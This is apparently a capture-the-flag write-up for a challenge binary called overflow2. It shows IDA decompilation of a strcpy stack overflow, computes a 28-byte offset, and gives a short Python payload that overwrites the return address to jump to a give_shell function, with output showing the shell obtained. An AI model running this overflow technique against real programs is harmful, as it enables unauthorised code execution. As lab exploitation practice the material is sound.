### S0lv3d by H4yicl3

try to download it

try to analysis it with IDA
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  if ( argc > 1 )
    vuln((char *)argv[1]);
  return 0;
}
char *__cdecl vuln(char *src)
{
  char dest; // [sp+10h] [bp-18h]@1	//try to overflow this to get eip

  return strcpy(&dest, src);
}
int give_shell()
{
  __gid_t v0; // ST1C_4@1

  v0 = getegid();
  setresgid(v0, v0, v0);
  return system("/bin/sh -i");		//redirect to give_shell
}
```

try find the offset with IDA
```
-00000018 dest            db ?
+00000004  r              db 4 dup(?)
.text:080484AD give_shell      proc near
```
offset =0x18+0x4=0x1c =28
address_of_give_shell = 0x080484ad

try to exploit that
```python
padding = "A"*28
give_shell="\xad\x84\x04\x08"
print padding + give_shell
```

try to run the exploit
```
./overflow2 `python overflow2.py`
$ whoami
hayicle
$ 
```

well done
